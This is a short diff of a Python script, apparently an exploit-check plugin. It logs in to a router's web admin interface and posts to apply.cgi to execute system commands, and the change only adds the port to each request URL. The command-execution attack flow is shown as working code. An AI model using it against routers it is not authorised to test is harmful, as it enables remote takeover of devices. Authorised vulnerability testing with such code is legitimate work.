@@ -18,17 +18,17 @@ description= r"""
 def packet(target, port, cookie):
 	try:
 		#Login
-		URL = 'http://'+target+'/'
+		URL = 'http://'+target+':'+port+'/'
 		headers = {'Cookie' : 'traffic_warning_NaN=2019.11:1', 'Authorization' : 'Basic ' + cookie}
 		s = requests.Session()
 		req = s.get(URL, headers=headers)
 		
 		#Section System Command
-		URL = 'http://'+target+'/Main_AdmStatus_Content.asp'
+		URL = 'http://'+target+':'+port+'/Main_AdmStatus_Content.asp'
 		req = s.get(URL, headers=headers)
 
 		#Execute System Commands
-		URL = 'http://'+target+'/apply.cgi'
+		URL = 'http://'+target+':'+port+'/apply.cgi'
 		params={'current_page': 'Main_AdmStatus_Content.asp',
 			'next_page': 'Main_AdmStatus_Content.asp',
 			'next_host': '',
@@ -44,7 +44,7 @@ def packet(target, port, cookie):
 		}
 		req = s.post(URL, headers=headers, params=params)
 		
-		URL = 'http://'+target+'/Main_AdmStatus_Content.asp'
+		URL = 'http://'+target+':'+port+'/Main_AdmStatus_Content.asp'
 		req = s.get(URL, headers=headers)
 	
 		if req.status_code == 200 and re.search('version', req.text):
